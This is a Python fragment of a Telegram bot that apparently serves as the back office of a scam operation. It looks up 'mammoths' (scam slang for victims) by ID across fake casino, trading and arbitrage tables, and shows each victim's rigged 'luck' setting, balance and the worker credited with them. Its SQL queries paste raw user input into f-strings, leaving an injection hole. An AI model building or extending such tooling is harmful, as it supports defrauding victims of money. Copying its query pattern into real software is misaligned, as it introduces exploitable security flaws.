@dp.callback_query_handler(text="Mamontenok")
async def spammer(call: types.CallbackQuery):
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
    await call.message.answer(f'<b>Введите айди мамонта</b>')
    await Mamontenok.q1.set()

@dp.message_handler(state=Mamontenok.q1)
async def spammers(message: types.Message,state:FSMContext):
    try:
        with sqlite3.connect(bd) as c:
            mamontarb = c.execute(f'SELECT * FROM mamonts_arbitr WHERE id = {message.text}').fetchone()
            mamontcas = c.execute(f'SELECT * FROM mamonts_casino WHERE id = {message.text}').fetchone()
            mamonttra = c.execute(f'SELECT * FROM mamonts_trade WHERE id = {message.text}').fetchone()
        try:
            with sqlite3.connect(bd) as c:
                worker = c.execute(f'SELECT * FROM workers WHERE ref_code = {mamontcas[2]}').fetchone()
            await message.answer(f'Казино\nID: {message.text}\nУдача: {mamontcas[5]}\nБаланс: {mamontcas[3]}\nЧей мамонт: {worker[1]}', reply_markup=menu.mamontcasinomenu(message.text))
        except:
            await message.answer('В казино отсутствует')
    except:
        await message.answer(f'Произошла ошибка, удостоверьтесь что айди введен правильно.')
    await state.finish()

if __name__ == '__main__':
    dp.middleware.setup(ThrottlingMiddleware())
    executor.start_polling(dp)